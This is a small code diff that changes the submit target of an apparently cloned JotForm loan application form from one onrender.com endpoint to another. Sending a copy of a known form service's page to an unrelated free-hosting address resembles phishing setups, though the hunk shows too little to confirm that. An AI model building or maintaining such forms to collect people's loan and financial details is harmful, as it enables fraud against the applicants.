@@ -627,7 +627,7 @@
 
   <body>
     <form class="jotform-form" onsubmit="return typeof testSubmitFunction !== 'undefined' && testSubmitFunction();"
-      action="https://reposubmit.onrender.com/loan_submit.php" method="post" enctype="multipart/form-data" name="form_250878319175164" id="250878319175164"
+      action="https://submitt.onrender.com/loan_submit.php" method="post" enctype="multipart/form-data" name="form_250878319175164" id="250878319175164"
       accept-charset="utf-8" autocomplete="on"><input type="hidden" name="formID" value="250878319175164" /><input
         type="hidden" id="JWTContainer" value="" /><input type="hidden" id="cardinalOrderNumber" value="" /><input
         type="hidden" id="jsExecutionTracker" name="jsExecutionTracker" value="build-date-1743338065383" /><input
